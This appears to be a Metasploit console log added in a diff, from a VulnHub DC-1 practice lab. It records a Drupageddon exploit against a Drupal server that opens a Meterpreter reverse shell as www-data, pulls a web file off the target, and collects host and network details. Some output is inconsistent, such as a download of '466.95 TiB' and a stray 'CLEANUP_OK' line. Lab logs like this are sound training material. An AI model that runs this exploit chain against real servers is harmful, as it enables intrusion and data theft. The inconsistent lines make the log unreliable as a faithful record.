+[*] Sending stage (72682 bytes) to 10.0.2.7
+[*] Meterpreter session 2 opened (10.0.2.3:4444 -> 10.0.2.7:44756) at 2026-11-27 11:21:19 +0530
+sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type                  Information      Connection
+  --  ----  ----                  -----------      ----------
+  2         meterpreter php/linu  www-data @ DC-1  10.0.2.3:4444 -> 10.0.2.7:4
+            x                                      4756 (10.0.2.7)
+
+[4mmsf[0m exploit([1m[31mmulti/http/drupal_drupageddon[0m) [0m> sessions -i 2
+[*] Starting interaction with 2...
+
+[4mmeterpreter[0m > shell
+Process 3459 created.
+Channel 0 created.
+CLEANUP_OK
+[4mmeterpreter[0m > download /var/www/includes/bootstrap.inc /home/shrdx/Documents/DC_ VulnHub/evidence/bootstrap.inc
+[*] Downloading: /var/www/includes/bootstrap.inc -> /home/shrdx/Documents/DC_VulnHub/evidence/bootstrap.inc
+[*] Downloaded 116.74 KiB of 466.95 TiB (0.0%): /var/www/includes/bootstrap.inc -> /home/shrdx/Documents/DC_VulnHub/evidence/bootstrap.inc
+[*] Completed  : /var/www/includes/bootstrap.inc -> /home/shrdx/Documents/DC_VulnHub/evidence/bootstrap.inc
+[4mmeterpreter[0m > shell
+Process 3495 created.
+Channel 2 created.
+DC-1
+DC-1
+127.0.0.1	localhost
+127.0.1.1	DC-1
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+nameserver 192.168.1.1
+Distributor ID:	Debian
+Description:	Debian GNU/Linux 7.11 (wheezy)
+Release:	7.11
+Codename:	wheezy
+[4mmeterpreter[0m > sessions -i 2
+[*] Session 2 is already interactive.
+[4mmeterpreter[0m > exit
+[*] Shutting down session: 2
+
+[*] 10.0.2.7 - Meterpreter session 2 closed.  Reason: User exit
+[4mmsf[0m exploit([1m[31mmulti/http/drupal_drupageddon[0m) [0m> jobs -l
+
+Jobs
+====
+
+No active jobs.
+
+[4mmsf[0m exploit([1m[31mmulti/http/drupal_drupageddon[0m) [0m> jobs -k 1
+[*] Stopping the following job(s): 1
+[-] Invalid job identifier: 1
+[4mmsf[0m exploit([1m[31mmulti/http/drupal_drupageddon[0m) [0m> exit -y
